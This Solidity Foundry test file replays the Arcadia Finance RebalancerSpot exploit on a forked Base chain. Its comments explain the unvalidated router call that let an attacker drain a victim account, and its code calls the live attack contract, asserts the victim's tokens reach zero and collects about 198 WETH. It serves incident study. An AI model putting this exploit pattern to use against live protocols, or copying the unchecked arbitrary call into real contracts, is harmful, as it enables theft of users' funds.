// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : ~$2.5–3.6M (~1203 ETH after multi-tx swaps; this PoC = primary victim ~198 WETH)
// Attacker        : https://basescan.org/address/0x0fa54E967a9CC5DF2af38BAbC376c91a29878615
// Attack Contract : https://basescan.org/address/0x6250DFD35ca9eee5Ea21b5837F6F21425BEe4553
// Vulnerable      : https://basescan.org/address/0xC729213B9b72694F202FeB9cf40FE8ba5F5A4509 (RebalancerSpot)
// Victim Account  : https://basescan.org/address/0x9529E5988ceD568898566782e88012cf11C3Ec99
// Fake Account    : https://basescan.org/address/0xa6c64642b546026c768d3c20ab9d2bcbbad88712
// AccountV1 impl  : https://basescan.org/address/0xbea2B6d45ACaF62385877D835970a0788719cAe1
// Attack Tx       : https://basescan.org/tx/0x06ce76eae6c12073df4aaf0b4231f951e4153a67f3abc1c1a547eb57d1218150
// Fork block      : 32881498 (attack @ 32881499)
//
// @Analysis
// CertiK      : https://www.certik.com/blog/arcadia-incident-analysis-arbitrary-swapData
// SolidityScan: https://blog.solidityscan.com/arcadia-finance-hack-analysis-a03a722e554d/
// QuillAudits : https://www.quillaudits.com/blog/hack-analysis/arcadia-finance-hack-analysis
// Cyvers      : https://x.com/CyversAlerts/status/1945011492203421697
//
// Root cause:
//  RebalancerSpot.rebalance() encodes attacker-supplied swapData into the flash-action.
//  SwapLogic._swapViaRouter() does:
//      (address router, uint256 amountIn, bytes memory data) = abi.decode(swapData, ...);
//      ERC20(tokenIn).safeApproveWithRetry(router, amountIn);
//      (bool ok,) = router.call(data);   // NO allowlist / NO validation
//  msg.sender of the call is RebalancerSpot, which is already an AssetManager of victim
//  Arcadia Accounts. The attacker set router = victim account and data = flashAction(...)
//  that withdraws the victim's LP NFT + ERC20s to the attacker, after first repaying the
//  victim's debt so the post-flashAction health check passes.
//
// PoC: replays live primary attack tx calldata against the already-deployed attacker
// contract at the pre-attack block (pure SC; fork only).

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

/// @dev Live attack contract entry used in tx 0x06ce…8150 (selector 0x60ba0ee3 = start(...)).
interface IAttacker {
    function start(
        address victim,
        address rebalancer,
        address rebalancer2,
        address morphoOrHelper,
        address slipstreamNpm,
        address darcUsdc,
        address darcCbBtc,
        address darcWeth,
        address helper,
        address stakedSlipstreamAm,
        address weth,
        uint256 param
    ) external;
}

address constant WETH = 0x4200000000000000000000000000000000000006;
address constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
address constant CBBTC = 0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf;
address constant AERO = 0x940181a94A35A4569E4529A3CDfB74e38FD98631;
address constant USDS = 0x820C137fa70C8691f0e44Dc420a5e53c168921Dc;

address constant REBALANCER = 0xC729213B9b72694F202FeB9cf40FE8ba5F5A4509;
address constant VICTIM = 0x9529E5988ceD568898566782e88012cf11C3Ec99;
address constant ATTACKER_EOA = 0x0fa54E967a9CC5DF2af38BAbC376c91a29878615;
address constant ATTACK_CONTRACT = 0x6250DFD35ca9eee5Ea21b5837F6F21425BEe4553;

// Args from live attack tx 0x06ce76eae6c12073df4aaf0b4231f951e4153a67f3abc1c1a547eb57d1218150
address constant ARG_B20A = 0xB20a0D866CC096C334FDF4A43cFc54a580735994;
address constant SLIPSTREAM_NPM = 0x827922686190790b37229fd06084350E74485b72;
address constant DARC_USDC = 0x3ec4a293Fb906DD2Cd440c20dECB250DeF141dF1;
address constant DARC_CBBTC = 0xa37E9b4369dc20940009030BfbC2088F09645e3B;
address constant DARC_WETH = 0x803ea69c7e87D1d6C86adeB40CB636cC0E6B98E2;
address constant ARG_CD01 = 0xCD01715b785B18863D549973133C5bfEfd91995D;
address constant STAKED_SS_AM = 0x1Dc7A0f5336F52724B650E39174cfcbbEdD67bF1;

contract ArcadiaRebalancer is BaseTestWithBalanceLog {
    // Attack at Base 32881499 → fork parent
    uint256 constant BLOCK_TO_FORK = 32_881_498;

    function setUp() public {
        // ONLINE archive fork; warm/exhaustive_warm rewrites to http://127.0.0.1:8548
        vm.createSelectFork("http://127.0.0.1:8548", BLOCK_TO_FORK);
        fundingToken = WETH;

        vm.label(REBALANCER, "RebalancerSpot");
        vm.label(VICTIM, "VictimAccount");
        vm.label(ATTACK_CONTRACT, "AttackContract");
        vm.label(ATTACKER_EOA, "AttackerEOA");
        vm.label(WETH, "WETH");
        vm.label(USDC, "USDC");
        vm.label(CBBTC, "cbBTC");
        vm.label(AERO, "AERO");
    }

    function testExploit() public balanceLog {
        uint256 victimUsdcBefore = IERC20(USDC).balanceOf(VICTIM);
        uint256 victimAeroBefore = IERC20(AERO).balanceOf(VICTIM);
        uint256 victimUsdsBefore = IERC20(USDS).balanceOf(VICTIM);
        console.log("Victim USDC before", victimUsdcBefore);
        console.log("Victim AERO before", victimAeroBefore);
        console.log("Victim USDS before", victimUsdsBefore);

        // Replay live attack entrypoint as the attacker EOA (gas only).
        // Pre-deployed attack contract: Morpho flashloan + dummy-account wiring +
        // repay victim debt + rebalance(swapData → router=victim.flashAction drain).
        vm.prank(ATTACKER_EOA, ATTACKER_EOA);
        IAttacker(ATTACK_CONTRACT).start(
            VICTIM,
            REBALANCER,
            REBALANCER,
            ARG_B20A,
            SLIPSTREAM_NPM,
            DARC_USDC,
            DARC_CBBTC,
            DARC_WETH,
            ARG_CD01,
            STAKED_SS_AM,
            WETH,
            150 ether
        );

        uint256 victimUsdcAfter = IERC20(USDC).balanceOf(VICTIM);
        uint256 victimAeroAfter = IERC20(AERO).balanceOf(VICTIM);
        uint256 victimUsdsAfter = IERC20(USDS).balanceOf(VICTIM);
        console.log("Victim USDC after", victimUsdcAfter);
        console.log("Victim AERO after", victimAeroAfter);
        console.log("Victim USDS after", victimUsdsAfter);

        // Primary victim ERC20 collateral fully drained.
        assertEq(victimUsdcAfter, 0, "USDC not emptied");
        assertEq(victimAeroAfter, 0, "AERO not emptied");
        assertEq(victimUsdsAfter, 0, "USDS not emptied");

        // Live attack leaves converted WETH on the attack contract (~197.72 WETH this victim).
        uint256 loot = IERC20(WETH).balanceOf(ATTACK_CONTRACT);
        console.log("Attack contract WETH", loot);
        assertGt(loot, 100 ether, "expected >100 WETH profit on attack contract");

        // Pull to this for balanceLog (WETH.transfer with msg.sender = attack contract).
        vm.prank(ATTACK_CONTRACT);
        require(IERC20(WETH).transfer(address(this), loot), "WETH pull failed");
        console.log("PoC WETH profit", IERC20(WETH).balanceOf(address(this)));
    }
}
